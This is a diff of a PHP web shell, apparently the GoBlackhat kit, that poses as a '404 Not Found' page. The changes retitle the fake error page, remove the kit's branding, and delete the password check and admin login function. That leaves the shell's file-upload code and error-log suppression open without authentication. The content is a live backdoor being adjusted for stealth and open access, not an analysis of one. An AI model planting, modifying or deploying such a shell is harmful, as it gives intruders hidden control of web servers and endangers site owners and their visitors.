@@ -74,7 +74,7 @@ function login_shell()
 <head>																									
 <meta charset="UTF-8">																									
 <meta name="viewport" content="width=device-width, initial-scale=1.0">																									
-<title>404 Not Found</title>																									
+<title>/404</title>																									
 <style>																									
 body {																									
 margin: 0;																									
@@ -150,10 +150,10 @@ transform: translateX(-100%);
 </head>																									
 <body>																									
 <div class="marquee-container">																									
-<div class="marquee">																									
-Copyright © GoBlackhat																									
+<div class="marquee">																																																		
 </div>																									
-</div>																									
+</div>			
+	<h1>/404</h1>
 <div class="login-container">																									
 <form action="" method="post">																									
 <div align="center">																									
@@ -164,16 +164,7 @@ Copyright © GoBlackhat
 </div>																									
 </body>																									
 </html>																									
-<?php exit();
-}
-if (!isset($_SESSION[md5($_SERVER["HTTP_HOST"])])) {
-    if (isset($_POST["pass"]) && password_verify($_POST["pass"], $password)) {
-        $_SESSION[md5($_SERVER["HTTP_HOST"])] = true;
-        header("refresh: 0;");
-    } else {
-        login_shell();
-    }
-}
+<?php 
 @set_time_limit(0);
 @clearstatcache();
 @ini_set("error_log", null);
@@ -201,15 +192,6 @@ if (isset($_FILES["file"]["tmp_name"])) {
             echo "GAGAL  KE $de";
         }
     }
-}
-
-// Fungsi untuk menampilkan form login
-function admin_login()
-{
-    echo '<form method="post">';
-    echo '<input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password">';
-    echo "</form>";
-    exit();
 }
 
 $Array = [
